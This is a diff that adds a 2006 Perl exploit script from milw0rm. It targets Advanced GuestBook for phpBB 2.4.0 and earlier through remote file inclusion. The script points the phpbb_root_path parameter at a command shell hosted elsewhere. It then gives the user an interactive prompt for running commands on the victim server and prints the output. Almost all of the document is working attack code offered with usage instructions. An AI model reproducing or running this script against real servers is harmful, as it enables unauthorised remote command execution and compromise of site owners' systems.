@@ -1,0 +1,58 @@
+#!usr/bin/perl
+use LWP::UserAgent;
+# Bug Found by [Oo]
+# Exploit coded by n0m3rcy
+# Copyright (c) 2006 n0m3rcy@bsdmail.org
+# Gr33tz; nukedx , Devil-00 , str0ke , cijfer
+# Usage; n0ag.pl <target> <cmd shell location> <cmd shell variable>
+if (@ARGV ne 3) { &usage; }
+else { &exploit; }
+sub header() {
+print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
+print "+    Advanced GuestBook for phpBB <= 2.4.0 Remote File Inclusion Exploit      +\r\n";
+print "+                             Bug found by [Oo]                               +\r\n";
+print "+                     Copyright (c) 2006 n0m3rcy@bsdmail.org                  +\r\n";
+print "+                  Gr33tz: nukedx , cijfer , str0ke , Devil-00                +\r\n";
+print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
+}
+sub usage() {
+  &header;
+  print "- Usage: $0 <target> <cmd shell location> <cmd shell variable>\r\n";
+  print "- <target> -> Victim's target ex: www.victim.com/path/\r\n";
+  print "- <cmd shell location> -> www.milw0rm.com/shelltxt\r\n";
+  print "- <cmd shell variable> -> cmd\r\n";
+  exit();
+}
+sub exploit () {
+my $tar = $ARGV[0];
+my $cmdt = $ARGV[1];
+my $cmdv = $ARGV[2];
+while() {
+print "[CMD] \$";
+while(<STDIN>) {
+$cmd=$_;
+chomp($cmd);
+my $exp = LWP::UserAgent->new() or die;
+my $go = HTTP::Request->new(GET =>$tar.' admin/addentry.php?phpbb_root_path='.$cmdt.'?&'.$cmdv.'='.$cmd)or die "\r\n[-] Connected fail\n";
+my $rgo = $exp->request($go);
+my $return = $rgo->content;
+my $return =~ tr/[\n]/[ê]/;
+if (!$cmd) { print "\nPlease Enter a Command\n\n"; $return =""; }
+elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
+       { print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit }
+elsif ($return =~/^<br.\/>.<b>Fatal.error/) { print "\nInvalid Command or No Return\n\n" }
+if ($return =~ /(.*)/) {
+my $finreturn = $1;
+my $finreturn=~ tr/[ê]/[\n]/;
+print "\r\n$finreturn\n\r";
+print "[+] Exploit successed\r\n";
+last;
+}
+else { print "[CMD] \$"; } 
+last;
+}
+exit;
+}
+}
+
+# milw0rm.com [2006-04-28]
